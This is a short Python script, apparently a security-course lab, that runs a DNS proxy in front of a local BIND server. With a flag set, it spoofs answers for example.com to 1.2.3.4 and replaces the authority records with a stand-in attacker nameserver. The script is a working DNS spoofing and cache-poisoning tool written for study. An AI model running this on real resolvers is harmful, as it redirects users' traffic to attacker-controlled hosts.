#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

localhost = "127.0.0.1"


# Forward DNS queries and return responses
def forward_dns_query(data, addr):
    # Create a socket to communicate with BIND server
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.sendto(data, (localhost, dns_port))
    response, _ = client.recvfrom(4096)
    client.close()
    return response

# Handle incoming DNS queries
def handle_query(sock):
    while True:
        data, addr = sock.recvfrom(4096)
        # print("Received query from", addr)
        response = forward_dns_query(data, addr)
        response = DNS(response)

        if SPOOF and response[DNSQR].qname == "example.com.":
            response[DNSRR].rdata = "1.2.3.4"
            for i in range(response[DNS].nscount):
                response[DNS].ns[DNSRR][i].rdata = "ns.dnslabattacker.net"

        sock.sendto(bytes(response), addr)

# Setup UDP socket
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((localhost, port))
    # print("DNS Proxy listening on port", port)
    handle_query(sock)
except Exception as e:
    print("An error occurred:", str(e))
finally:
    sock.close()
